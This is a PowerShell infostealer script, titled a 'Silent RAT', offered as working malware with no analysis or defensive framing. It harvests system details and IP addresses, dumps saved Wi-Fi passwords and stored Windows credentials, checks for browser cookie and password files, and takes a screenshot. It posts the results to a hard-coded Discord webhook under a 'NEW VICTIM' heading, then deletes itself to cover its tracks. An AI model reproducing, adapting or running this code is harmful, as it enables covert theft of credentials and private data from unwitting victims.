# Silent RAT - Steals all data and sends to Discord
$webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"

# Function to get system info
$computer = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
$localIPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join " | "

# Steal Chrome cookies (copy file)
$chromeCookies = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Cookies"
$edgeCookies = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Cookies"
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"

$browserData = @"
CHROME: $(if (Test-Path $chromeCookies) {"COOKIES FOUND"} else {"NOT FOUND"})
EDGE: $(if (Test-Path $edgeCookies) {"COOKIES FOUND"} else {"NOT FOUND"})
FIREFOX: $(if (Test-Path $firefoxProfiles) {"PROFILES FOUND"} else {"NOT FOUND"})
"@

# Steal WiFi passwords
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.ToString().Split(":")[1].Trim()
}
$wifiPasswords = ""
foreach ($profile in $wifiProfiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    $wifiPasswords += "$profile : $($password.ToString().Split(':')[1].Trim())`n"
}

# Steal saved credentials
$credentials = cmdkey /list

# Take screenshot
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$screenshotPath = "$env:TEMP\screenshot.png"
$bitmap.Save($screenshotPath)
$graphic.Dispose()
$bitmap.Dispose()

# Encode screenshot to base64
$screenshotBase64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($screenshotPath))

# Get browser passwords (Chrome)
$chromePasswordsPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$passwords = ""
if (Test-Path $chromePasswordsPath) {
    $passwords = "CHROME PASSWORDS FILE EXISTS AT: $chromePasswordsPath"
}

# Build final message
$message = @"
**🔴 NEW VICTIM - FULL DATA**

**💻 Computer:** $computer
**👤 User:** $user
**🖥️ OS:** $os
**🌐 Public IP:** $publicIP
**📡 Local IPs:** $localIPs

**🍪 Browser Data:**
$browserData

**🔑 Saved Credentials:**
$credentials

**📡 WiFi Passwords:**
$wifiPasswords

**📁 Passwords File:** $passwords
"@

# Send to Discord
$payload = @{
    content = $message
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json"

# Send screenshot as file
$boundary = [System.Guid]::NewGuid().ToString()
$multipartContent = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="screenshot.png"
Content-Type: image/png

$screenshotBase64
--$boundary--
"@

Invoke-RestMethod -Uri $webhook -Method Post -Body $multipartContent -ContentType "multipart/form-data; boundary=$boundary"

# Clean up
Remove-Item $screenshotPath -Force

# Self-delete
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
